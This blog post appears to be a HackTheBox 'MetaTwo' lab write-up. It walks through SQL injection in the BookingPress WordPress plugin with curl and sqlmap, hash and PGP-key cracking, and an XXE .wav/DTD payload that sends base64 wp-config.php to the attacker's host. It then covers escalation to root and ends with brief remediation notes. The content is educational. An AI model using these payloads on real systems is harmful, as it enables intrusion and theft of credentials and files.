--- 
title: "HTB MetaTwo | Linux   Easy"
author: ""
date: 2023-05-01T20:27:02+02:00
description: ""
draft: false
disableComments: false
categories: []
series: [] #Taxonomy to list "See Also" Section in Opengraph Templates
tags: []
slug: ""
summary: ""
---
HackTheBox MetaTwo is a Linux machine rated easy and flawed with vulnerable and outdated components(A06:2021), injection(A03:2021) and security misconfiguration(A05:2021).

Attack Chain: The attack begins by exploiting an SQL and XML external entity injection vulnerability to disclose sensitive credentials. Then uses the credentials to log into an FTP server and exfiltrate the directories and further discovers a mail server credential that was reused for ssh access to gain a foothold on the box.  The attacker then exploited a security misconfiguration in a password manager tool to gain root privilege.

#### Initialization
```bash
# connect to vpn
sudo openvpn --auth-nocache --config lab_kralyn.ovpn
``` 

#### Enumeration
```bash
# discover ports and services
sudo nmap -p$(sudo nmap -sSU --min-rate 1000 10.10.11.186 | sed -nE 's/^([0-9]+)\/(tcp|udp).*$/\1/p' | paste -sd ",") -sSUVC --open -vvv 10.10.11.186 -oA nmap_metatwo
xsltproc nmap_metatwo.xml -o nmap_metatwo.html         # converts xml to html
firefox nmap_metatwo.html      # view in browser
#--snip--#
21/tcp open ftp 
22/tcp open OpenSSH 8.4p1 Debian 5+deb11u1 
80/tcp open nginx 1.18.0(GET HEAD POST)

# discover technologies used
whatweb 10.10.11.186      # if domain exits add to host file and rerun command
#--snip--#
HTTPServer[nginx/1.18.0]
RedirectLocation[http://metapress.htb/]

MetaGenerator[WordPress 5.6.2]
PHP[8.0.24]
WordPress[5.6.2]  # possible exploit: https://wpscan.com/wordpress/562
nginx[1.18.0]

# add domain and subdomain to hosts file
echo '10.10.11.186 metapress.htb' | sudo tee -a /etc/hosts
``` 

```bash
# discover subdomains
# with ffuf
ffuf -c -u http://metapress.htb/ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.metapress.htb' -t 50 -ac -s

# with gobuster
gobuster vhost -u http://10.10.11.186 -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt

gobuster dns -d metapress.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt

# with wfuzz
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://metapress.htb/ -H 'Host: FUZZ.metapress.htb' --hc '302'
```

```bash
# discover directories
# with wpscan: -e(enumerate) ap(all plugins), at(all themes), tt(timthumbs), u(users), cb(config backups)
sudo gem install wpscan      # install wpscan
wpscan --url http://metapress.htb -e ap,at,tt,u,cb --stealthy -o wpscan_metatwo

# with ffuf
ffuf -c -u http://metapress.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -ac
#--snip--#
301    wp-admin   
302    admin
301    wp-includes    
301    wp-content  
301    feed  
302    login   
301    rss  
301    about 
301    events  
302    dashboard               
301    sample 

# with gobuster
gobuster dir -u http://metapress.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -q
#--snip--#
301    /wp-admin 			
301    /wp-contents 		
301    /wp-includes 
302    /admin 		        
301    /feed 		        
302    /login 		      
301    /rss 		
301    /about
301    /cancel-appointment
301    /thank-you/
301    /events/

dirsearch -u http://metapress.htb/ -t 50 -q -i 200
#--snip--#
/.htaccess
/license.txt
/readme.html
/robots.txt
/wp-admin/install.php
/wp-config.php
/wp-content/
/wp-cron.php
/wp-includes/rss-functions.php
/wp-json/wp/v2/users/
/wp-login.php
/wp-json/

# with wfuzz
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -t 50 -u http://metapress.htb/FUZZ --hc 404
#--snip--#
200 "license.txt"            
200  "readme.html"            
200  ".htaccess"              
301  "index.php"              
405  "xmlrpc.php"             
200  "wp-login.php"           
200  "robots.txt"             
200  "wp-config.php"          
302  "sitemap.xml"                                 
500  "wp-settings.php"        
403  "wp-mail.php"            
200  "wp-cron.php"            
302  "wp-activate.php"  

# with feroxbuster
feroxbuster -u http://metapress.htb -t 50 -x php,html,txt -E -q --no-state -s '200,302,403'
#--snip--#
302  /wp-admin/
302  /login
200  /wp-includes/
302  /wp-login.php
200  /wp-json
200  /wp-content/
```

#### Exploration
Explored the homepage, extracted, visited and screenshot all the hyperlinks therein. Then added `http://metapress.htb` to scope, crawled and audited it with Burp Suite. I found a plugin `bookingpress` which wpscan missed. Then searched for exploits on `php 8.0.24`, `wordpress 5.6.2`, `nginx 1.18.0`, `bookingpress 1.0.10` to discover an unauthenticated [bookingpress](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357) vulnerability registered as [CVE-2022-0739](https://www.cve.org/CVERecord?id=CVE-2022-0739)and an authenticated [wordpress](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5) vulnerability registered as [CVE-2021-29447](https://www.cve.org/CVERecord?id=CVE-2021-29447). 

```shell
# visit the hyperlinks in website home and screenshot them.
curl -s http://metapress.htb/ | grep -oE 'href="https?://[^"]+"' | cut -d'"' -f2 | gowitness file -f - --disable-db -P screenshots/

# list screenshots and view them - events page looked interesting
ls screenshots/    
open screenshots/http-metapress.htb-events-.png
```
![Event Service Page](/images/metatwo/metatwo01.png "Event Service Page")

![BoookingPress Plugin Discovery](/images/metatwo/metatwo02.png "BoookingPress Plugin Discovery")

![The wpnonce](/images/metatwo/metatwo03.png "The wpnonce")

Filled out the details at  the `/events` page and intercepted the 'Book Appointment' button action to find the  wpnonce `3bb83c5f64` .
#### Exploitation
```bash
# after getting the wpnonce value from the events page
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=3bb83c5f64&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
#--snip--#
[
	{
		"bookingpress_service_id": "10.5.15-MariaDB-0+deb11u1",
		"bookingpress_category_id": "Debian 11",
		"bookingpress_service_name": "debian-linux-gnu",
		"bookingpress_service_price": "$1.00",
		"bookingpress_service_duration_val": "2",
		"bookingpress_service_duration_unit": "3",
		"bookingpress_service_description": "4",
		"bookingpress_service_position": "5",
		"bookingpress_servicedate_created": "6",
		"service_price_without_currency": 1,
		"img_url": "http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg"
	}
]

# having under studied the injection point, I automated the process using sqlmap
sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --method POST --data 'action=bookingpress_front_get_category_services&_wpnonce=3bb83c5f64&category_id=33&total_service=1' -p total_service --dbs --batch
#--snip--#
[04:05:04] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[04:05:04] [INFO] fetching database names
available databases [2]:
[*] blog
[*] information_schema

sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --method POST --data 'action=bookingpress_front_get_category_services&_wpnonce=3bb83c5f64&category_id=33&total_service=1' -p total_service --dbms MySQL -D blog --tables --threads 10 --level 5 --batch 
#--snip--#
Database: blog
[27 tables]
+--------------------------------------+
| wp_bookingpress_appointment_bookings |
| wp_bookingpress_categories           |
| wp_bookingpress_customers            |
| wp_bookingpress_customers_meta       |
| wp_bookingpress_customize_settings   |
| wp_bookingpress_debug_payment_log    |
| wp_bookingpress_default_daysoff      |
| wp_bookingpress_default_workhours    |
| wp_bookingpress_entries              |
| wp_bookingpress_form_fields          |
| wp_bookingpress_notifications        |
| wp_bookingpress_payment_logs         |
| wp_bookingpress_services             |
| wp_bookingpress_servicesmeta         |
| wp_bookingpress_settings             |
| wp_commentmeta                       |
| wp_comments                          |
| wp_links                             |
| wp_options                           |
| wp_postmeta                          |
| wp_posts                             |
| wp_term_relationships                |
| wp_term_taxonomy                     |
| wp_termmeta                          |
| wp_terms                             |
| wp_usermeta                          |
| wp_users                             |
+--------------------------------------+

sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --method POST --data 'action=bookingpress_front_get_category_services&_wpnonce=3bb83c5f64&category_id=33&total_service=1' -p total_service --dbms MySQL -D blog -T wp_users --columns --batch
#--snip--#
Database: blog
Table: wp_users
[10 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| display_name        | varchar(250)        |
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(255)        |
| user_email          | varchar(100)        |
| user_login          | varchar(60)         |
| user_nicename       | varchar(50)         |
| user_pass           | varchar(255)        |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
+---------------------+---------------------+

sqlmap -u 'http://metapress.htb/wp-admin/admin-ajax.php' --method POST --data 'action=bookingpress_front_get_category_services&_wpnonce=3bb83c5f64&category_id=33&total_service=1' -p total_service --dbms MySQL -D blog -T wp_users -C user_login,user_pass --batch --dump
#--snip--#
Database: blog
Table: wp_users
[2 entries]
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. |
| manager    | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 |
+------------+------------------------------------+

#--nano metatwo.hashes--#
admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
#--metatwo.hashes--#

# identify the hash type
hashid '$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.'
<<SNIP
Analyzing '$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.'
[+] Wordpress ≥ v2.6.2 
[+] Joomla ≥ v2.5.18 
[+] PHPass' Portable Hash 
SNIP

echo '$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.' | hash-identifier
Possible Hashs:
[+] MD5(Wordpress)

# cracking the passwords - https://hashcat.net/wiki/doku.php?id=example_hashes
# with hashcat
hashcat -m 400 --username metatwo.hashes /usr/share/wordlists/rockyou.txt -O
hashcat -m 400 --username metatwo.hashes --show
#--snip--#
manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar

# with johntheripper
john --wordlist=/usr/share/wordlists/rockyou.txt metatwo.hashes
john metatwo.hashes --show --format=phpass
#--snip--#
manager:partylikearockstar
```

![Logged In](/images/metatwo/metatwo04.png "Logged In")
Navigating to `http://metapress.htb/wp-login.php` I logged with the hashed credentials. Now returned to the second reference. After a careful read and further research for 'poc CVE-2021-29447' grasped how to exploit this vulnerability leveraging on these resources [motikan2010](https://github.com/motikan2010/CVE-2021-29447/blob/main/README.md) and  [tryhackme](https://tryhackme.com/room/wordpresscve202129447). Create two files, a .wav media file to upload to the authenticated site, and a .dtd document to exfiltrate the desired information.
```shell
# start php server
php -S 0.0.0.0:8008

# create the .wav playload
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.70:8008/evil.dtd'"'"'>%remote;%init;%trick;] >\x00'> payload.wav

#--nano evil.dtd--#
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.70:8008/?p=%file;'>" >
#--evil.dtd--#

# upload payload via media tab and decode returned content. see figure below
php -r 'echo zlib_decode(base64_decode("base64here"));' | tee -a wp-config.php
```

![Data Exfiltration](/images/metatwo/metatwo04.png "Data Exfiltration")

[wp-config.php](#)
```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

Added the subdomain to host file and logged into the ftp server with the above creds and explored.
```bash
# add subdomain to host file
echo "10.10.11.186 metapress.htb" | sudo sed -i 's/metapress.htb/& ftp.metapress.htb/' /etc/hosts

sudo apt install lftp    # install ftp client - https://www.mankier.com/1/lftp
lftp --user metapress.htb ftp.metapress.htb    # on prompt submit password: 9NYS_ii@FyL_p5M2NvJ
lftp metapress.htb@ftp.metapress.htb:~> ls    # list content. use CTRL+L to clear screen.
#--snip--#
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5  2022 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5  2022 mailer

lftp metapress.htb@ftp.metapress.htb:/> mirror . ftp      # download contents of current paths to local folder ftp
lftp metapress.htb@ftp.metapress.htb:/> exit    # exit the ftp server

# on attacker's terminal change to ftp and search for juicy stuffs. Got a hit in send_email.php
find ftp -name '*.php*' -size +0c -type f -exec ls -lah {} +    # list all .php files
find ftp -name '*.php*' -size +0c -type f -exec grep -iR "password" {} + | more
grep 'ftp/mailer' -irne 'pass' | more -n 10
cat ftp/mailer/send_email.php
#--snip--#
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;

# no publicly accessible mail server thus I tried it on ssh
sshpass -pCb4_JmWM8zUZWMu@Ys ssh jnelson@metapress.htb
ls -la
#--snip--#
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25  2022 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile
-rw-r----- 1 root    jnelson   33 May  1 10:48 user.txt

cat user.txt     # capture the user flag
```

#### Escalation
Manually investigating the system i found a .passie hidden folder which appear to be a password manager tool. There are only two users with shell, root and jnelson.
```bash				       
grep -ie 'sh$' /etc/passwd    # get users with shell
#--snip--#
root:x:0:0:root:/root:/bin/bash
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash

sudo -l						           # users sudo right
ss -tpln						       # open tcp ports
#--snip--#
tate    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process  
LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*              
LISTEN   0        511              0.0.0.0:80            0.0.0.0:*              
LISTEN   0        128              0.0.0.0:22            0.0.0.0:*              
LISTEN   0        511                 [::]:80               [::]:*              
LISTEN   0        128                    *:21                  *:*              
LISTEN   0        128                 [::]:22               [::]:*   

# explored the .passpie directory
find .passpie/ -exec ls -lah {} +;
#--snip--#
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .passpie/.config
-r-xr-x--- 1 jnelson jnelson 5.2K Jun 26  2022 .passpie/.keys
-r-xr-x--- 1 jnelson jnelson  683 Oct 25  2022 .passpie/ssh/jnelson.pass
-r-xr-x--- 1 jnelson jnelson  673 Oct 25  2022 .passpie/ssh/root.pass

# researched the tool and its exploitability - https://github.com/marcwebbie/passpie
cat .passpie/{.config,.keys}   # # found a public and private pgp keys in .keys file
cat .passpie/ssh/{jnelson.pass,root.pass}

# from the victim's machine grab the private key and export to local machine for cracking
sed -n '/BEGIN PGP PRIVATE KEY BLOCK/,/END PGP PRIVATE KEY BLOCK/p' .passpie/.key
#--snip--# stored as passpie.key
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=7Uo6
-----END PGP PRIVATE KEY BLOCK-----

# crack with johntheripper
gpg2john passpie.key > passpie.john    # convert to johntheripper format
john --wordlist=/usr/share/wordlists/rockyou.txt passpie.john
john passpie.john --show # blink182

# on the victim's machine we now tried this value as the passphrase
passpie export --passphrase blink182 users-ssh-creds
cat users-ssh-creds
#--snip--#
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0

# change to root user on the box
su  # on prompt submit: p7qfAZt4_A1xo_0x
cd ~
cat root.txt       # capture the root flag
```

#### Exfiltration
We have already collected the source code from the ftp server. So let's just collect the helper scripts.
```shell
# on the victim's machine as root user
python3 -m http.server -d restore

# on the attacker's machine
wget -R 'index.html*' -r -nH -P restore http://10.10.11.186:8000/
```
#### Remediation
**Fixing the Foothold Vector**  
Fixing the vector that allowed a foothold requires upgrading to a patched version of [bookingpress plugin](https://plugins.trac.wordpress.org/changeset/2684789) and [wordpress](https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rv47-pc52-qrhh)  
**Fixing the Privilege Escalation Vector**  
The passpie keys should not have been stored in the server. The administrator should clean that up.
###### References
[Patched WordPress 5.7.1 Repository](https://github.com/WordPress/wordpress-develop/tree/5.7.1), [Finding a File Containing a Particular Text String In Linux Server - Cyberciti](https://www.cyberciti.biz/faq/howto-search-find-file-for-text-string/)


>I build secure and reliable infrastructures, hunt for flaws in insecure systems and remediate them to meet compliance. Book a consultation [session](https://calendly.com/samuelnwoye/10min).